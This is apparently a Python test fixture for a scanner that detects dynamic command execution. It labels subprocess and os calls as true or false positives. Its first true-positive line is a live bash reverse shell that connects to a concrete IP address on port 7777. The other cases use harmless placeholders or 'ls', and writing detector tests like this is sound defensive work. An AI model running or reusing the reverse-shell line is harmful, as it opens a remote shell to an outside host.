import subprocess
import os


# TP
os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")

subprocess.run(['python', '-c', 'payload("Hello World")'])

x = 'python'
subprocess.call([x, '-c', 'import sys; sys.exit()'])

subprocess.Popen(['python', '-c', 'payload("Dynamic execution")'])

subprocess.check_call(['python', '-c', 'payload("Check call dynamic execution")'])

subprocess.check_output(['python', '-c', 'payload("Check output dynamic execution")'])

os.system('python -c "payload(\'Hello World\')"')

os.popen('python -c "payload(\'Popen dynamic execution\')"')

os.spawnl(os.P_WAIT, 'python', 'python', '-c', 'payload("Spawn dynamic execution")')

os.spawnlp(os.P_WAIT, 'python', 'python', '-c', 'payload("Spawnlp dynamic execution")')

os.execv('python', ['python', '-c', 'payload("Execv dynamic execution")'])

os.execvp('python', ['python', '-c', 'payload("Execvp dynamic execution")'])

Y = subprocess


# FP

os.system('ls')

os.popen('ls')

os.spawnl(os.P_WAIT, 'ls', 'ls')

os.execv('ls', ['ls', '-l'])

subprocess.run(['ls', '-l'])

subprocess.call(['ls', '-a'])

subprocess.Popen(['ls', '-la'])

subprocess.check_call(['ls'])

subprocess.check_output(['ls'])
